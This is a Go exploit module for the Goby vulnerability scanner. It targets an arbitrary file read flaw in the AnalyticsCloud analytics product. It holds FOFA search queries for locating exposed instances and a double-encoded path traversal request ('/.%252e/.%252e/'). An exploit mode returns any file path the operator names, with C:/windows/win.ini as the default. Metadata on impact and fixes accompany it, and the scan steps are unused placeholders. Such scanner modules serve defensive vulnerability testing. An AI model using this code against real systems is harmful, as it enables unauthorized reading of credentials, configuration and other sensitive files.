package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "AnalyticsCloud  /windows/win.in File Read Vulnerability",
    "Description": "<p>AnalyticsCloud integrates advanced data analysis technologies and tools, capable of handling data from various sources, including cloud data, on-premises data, legacy data, and big data. It provides an end-to-end solution from data collection, organization, and analysis to application, helping enterprises better understand and utilize their data to optimize business processes and enhance decision-making efficiency.</p>",
    "Product": "AnalyticsCloud",
    "Homepage": "https://www.seeyon.com/home/Zhuanq/fenxiyun.html",
    "DisclosureDate": "2024-07-23",
    "PostTime": "2024-07-24",
    "Author": "1538279017@qq.com",
    "FofaQuery": "(body=\"<Message>File not found</Message>\" || body=\"/newportal/manifest.json\") || (body=\"/newportal/static/css/main\" && body=\"/newportal/static/css/\")",
    "GobyQuery": "(body=\"<Message>File not found</Message>\" || body=\"/newportal/manifest.json\") || (body=\"/newportal/static/css/main\" && body=\"/newportal/static/css/\")",
    "Level": "1",
    "Impact": "<p>Sensitive Data Leakage: Attackers can read sensitive files within the system, such as configuration files, database credentials, user information, leading to data breaches.System Information Exposure: Attackers can read system files to understand the system structure and software versions, enabling them to devise more targeted attack strategies.Privilege Escalation: By reading specific files (such as password files), attackers may gain higher privileges, allowing them to further control the system.Business Logic Leakage: Attackers can read application code or log files to understand business logic and operational processes, helping them find other vulnerabilities to exploit.</p>",
    "Recommendation": "<p>Input Validation:Path Restriction: Strictly validate file paths provided by users to ensure they can only access predefined, secure directories.</p><p>Whitelist: Use a whitelist mechanism to allow access only to specific directories or files, preventing path traversal attacks.</p><p>Access Control:Least Privilege Principle: Ensure that applications and user accounts have only the necessary permissions to read files, avoiding excessive access rights.</p><p>Sensitive File Isolation: Store sensitive files and configuration files in restricted areas, not directly exposed to users.</p><p>File Access Control:Restrict File Access: Configure file access control lists (ACLs) or permission policies to limit access to sensitive files.</p><p>Use Secure Libraries: Employ security-reviewed libraries and frameworks for file operations, avoiding custom implementations.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/140548707"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "C:/windows/win.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "HW-2024"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.9",
    "Translation": {
        "CN": {
            "Name": "AnalyticsCloud 分析云 /windows/win.in 文件读取漏洞",
            "Product": "AnalyticsCloud",
            "Description": "<p>AnalyticsCloud 分析云集成了先进的数据分析技术和工具，能够处理来自各种数据源的数据，包括云数据、本地数据、传统数据和大数据等。它提供了从数据收集、整理、分析到应用的全链路解决方案，帮助企业更好地理解和利用数据，从而优化业务流程、提升决策效率。<br></p>",
            "Recommendation": "<p>输入验证：限制路径：对用户输入的文件路径进行严格的验证，确保其只能访问预定义的安全目录。</p><p>白名单：使用白名单机制，只允许访问特定目录或文件，防止路径遍历攻击。</p><p>权限控制：最小权限原则：确保应用程序和用户账户仅具备读取必要文件的权限，避免不必要的文件访问权限。</p><p>隔离敏感文件：将敏感文件和配置文件存放在访问受限的区域，不直接暴露给用户。</p><p>文件访问控制：限制文件访问：配置文件访问控制列表（ACL）或权限策略，限制对敏感文件的访问。</p><p>使用安全的库：使用经过安全审查的库和框架进行文件操作，避免使用自定义实现。<br></p>",
            "Impact": "<p>敏感数据泄露：攻击者可以读取系统中的敏感文件，如配置文件、数据库凭证、用户信息等，导致数据泄露。系统信息暴露：攻击者可以读取系统文件，了解系统结构和软件版本，进而制定更有针对性的攻击策略。权限提升：通过读取特定文件（如密码文件），攻击者可能获得更高权限，进一步控制系统。业务逻辑泄漏：攻击者可以通过读取应用程序代码或日志文件，了解业务逻辑和操作流程，从而找到其他漏洞进行攻击。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "AnalyticsCloud  /windows/win.in File Read Vulnerability",
            "Product": "AnalyticsCloud",
            "Description": "<p>AnalyticsCloud integrates advanced data analysis technologies and tools, capable of handling data from various sources, including cloud data, on-premises data, legacy data, and big data. It provides an end-to-end solution from data collection, organization, and analysis to application, helping enterprises better understand and utilize their data to optimize business processes and enhance decision-making efficiency.<br></p>",
            "Recommendation": "<p>Input Validation:Path Restriction: Strictly validate file paths provided by users to ensure they can only access predefined, secure directories.</p><p>Whitelist: Use a whitelist mechanism to allow access only to specific directories or files, preventing path traversal attacks.</p><p>Access Control:Least Privilege Principle: Ensure that applications and user accounts have only the necessary permissions to read files, avoiding excessive access rights.</p><p>Sensitive File Isolation: Store sensitive files and configuration files in restricted areas, not directly exposed to users.</p><p>File Access Control:Restrict File Access: Configure file access control lists (ACLs) or permission policies to limit access to sensitive files.</p><p>Use Secure Libraries: Employ security-reviewed libraries and frameworks for file operations, avoiding custom implementations.<br></p>",
            "Impact": "<p>Sensitive Data Leakage: Attackers can read sensitive files within the system, such as configuration files, database credentials, user information, leading to data breaches.System Information Exposure: Attackers can read system files to understand the system structure and software versions, enabling them to devise more targeted attack strategies.Privilege Escalation: By reading specific files (such as password files), attackers may gain higher privileges, allowing them to further control the system.Business Logic Leakage: Attackers can read application code or log files to understand business logic and operational processes, helping them find other vulnerabilities to exploit.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10973"
}`

	postOrGet_fiejjifepu := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {

		//发送get请求
		//发送get请求
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		path := "/.%252e/.%252e/" + fileUrl
		resp, err := setGetRequest(hostInfo, path, map[string]string{})

		if err != nil || resp == nil || resp.StatusCode != 200 {
			return "", err
		}
		respTxt := resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(

		goutils.GetFileName(),

		expJson,

		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 此处需要修改：设置成功后的vulurl

			vulURL := "/.%252e/.%252e/"

			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件

			defaultModeMap := map[string]string{
				"C:\\Windows\\win.ini": "[mci extensions]",
			}

			// 函数继承

			uploadFileFunc := postOrGet_fiejjifepu

			// 请注意：后续代码为模板代码，非特殊情况，无需更改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			for fileUrl, fileText := range defaultModeMap {

				resp, err := uploadFileFunc(u, fileUrl)

				if err != nil {

					continue

				}

				if strings.Contains(resp, fileText) {

					// 设置VULURL

					ss.VulURL = u.HostInfo + vulURL

					return true

				}

			}

			return false

		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			var fileUrl string

			var fileText string

			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件

			defaultModeMap := map[string][2]string{
				"Windows": {"C:\\Windows\\win.ini", "[mci extensions]"},
			}

			// 此处需要修改：函数继承

			uploadFileFunc := postOrGet_fiejjifepu

			// 请注意，后续代码为模板固化，正常情况下均无需修改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			if mode == "Customize" {

				fileUrl = goutils.B2S(ss.Params["Customize"])

			} else {

				if _, ok := defaultModeMap[mode]; ok {

					fileUrl = defaultModeMap[mode][0]

					fileText = defaultModeMap[mode][1]

				} else {

					expResult.Success = false

					return expResult

				}

			}

			// 获取返回结果url和返回请求头

			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)

			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {

				expResult.Success = false

				return expResult

			}

			expResult.Success = true

			expResult.Output = "This is file content: \n" + resp

			return expResult

		},
	))
}
